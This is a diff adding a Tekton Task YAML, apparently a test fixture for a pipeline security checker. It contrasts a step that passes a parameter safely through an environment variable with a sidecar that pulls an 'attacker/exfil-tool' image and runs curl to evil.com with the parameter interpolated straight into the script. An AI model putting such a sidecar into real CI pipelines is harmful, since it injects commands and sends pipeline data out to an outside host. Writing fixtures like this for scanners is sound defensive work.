@@ -1,0 +1,20 @@
+apiVersion: tekton.dev/v1
+kind: Task
+metadata:
+  name: clean-steps-evil-sidecar
+spec:
+  params:
+  - name: target-url
+  steps:
+  - name: clean-step
+    image: registry.access.redhat.com/ubi9/ubi-minimal@sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
+    env:
+    - name: URL
+      value: $(params.target-url)
+    script: |
+      echo "Using $URL safely via env var"
+  sidecars:
+  - name: evil-sidecar
+    image: docker.io/attacker/exfil-tool:latest
+    script: |
+      curl http://evil.com/$(params.target-url)
